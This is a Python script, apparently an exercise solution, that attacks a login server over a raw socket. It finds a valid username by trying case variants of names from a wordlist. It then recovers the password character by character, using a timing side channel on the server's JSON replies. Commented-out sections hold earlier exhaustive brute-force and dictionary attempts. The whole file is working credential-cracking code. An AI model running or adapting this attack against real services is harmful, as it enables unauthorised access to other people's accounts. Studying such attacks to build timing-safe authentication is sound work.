
import sys
import socket
import itertools
import json
from datetime import datetime
from datetime import timedelta
letters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

conn = socket.socket()
args = sys.argv
ip_addr = args[1]
port = int(args[2])
conn.connect((ip_addr, port))

# mesg = ''
# i = 1
# loop = True
# while loop:
#     for x in itertools.product(letters, repeat=i):
#         for n in range(i):
#            mesg = mesg + x[n]
#         byt_msg = mesg.encode()
#         conn.send(byt_msg)
#         sevr_meg = conn.recv(1024)
#         respond = sevr_meg.decode()
#         if respond == 'Connection success!':
#             loop = False
#             print(mesg)
#         mesg = ''
#     i += 1
# conn.close()
login = ''
password = ''
diff = 0

a = open('logins.txt', 'r')
check = True

for x in a:
    if check is False:
        break
    pw = (x.rstrip('\n'))

    # count = 0
    # for i in pw:
    #     if i in '1234567890':
    #         count += 1
    #
    # if count == len(pw):
    #     # print (pw)
    #     byt_msg = pw.encode()
    #     conn.send(byt_msg)
    #     sevr_meg = conn.recv(1024)
    #     respond = sevr_meg.decode()
    #     if respond == 'Connection success!':
    #         print(pw)
    #         conn.close()
    #         exit()
    # else:
    results = list(map(''.join, itertools.product(*zip(pw.upper(), pw.lower()))))
    # print(results)
    for y in results:
        jmsg = {
            "login": y,
            "password": " "
        }
        byt_msg = (json.dumps(jmsg)).encode()
        # start = datetime.now()
        conn.send(byt_msg)
        sevr_meg = conn.recv(1024)
        # finish = datetime.now()
        respond = sevr_meg.decode()
        jstr = json.loads(respond)
        if jstr == {"result": "Wrong password!"}:
            login = y
            # diff = finish - start
            # conn.close()
            check = False
            break

flag = True

while flag:
    for x in letters:
        jmsg_login = {"login": login, "password": password + x}
        byt_msg = (json.dumps(jmsg_login)).encode()
        conn.send(byt_msg)
        start = datetime.now()
        sevr_meg = conn.recv(1024)
        finish = datetime.now()
        difference = finish - start
        respond = sevr_meg.decode()
        jstr = json.loads(respond)
        # try:
        #     jstr = json.loads(respond)
        # except Exception:
        #     pass
        # else:
        #     if diff < difference:
        #         password = password + x
        #         break
        #     elif jstr == {"result": "Connection success!"}:
        #         print(json.dumps(jmsg_login))
        #         flag = False
        #         conn.close()
        #         exit()
        # if jstr == {"result": "Exception happened during login"}:
        #     password = password + x
        #     break
        t1 = timedelta(seconds=0.1)
        if difference > t1:
            password = password + x
            break
        elif jstr == {"result": "Connection success!"}:
            print(json.dumps(jmsg_login))
            flag = False
            conn.close()
            exit()


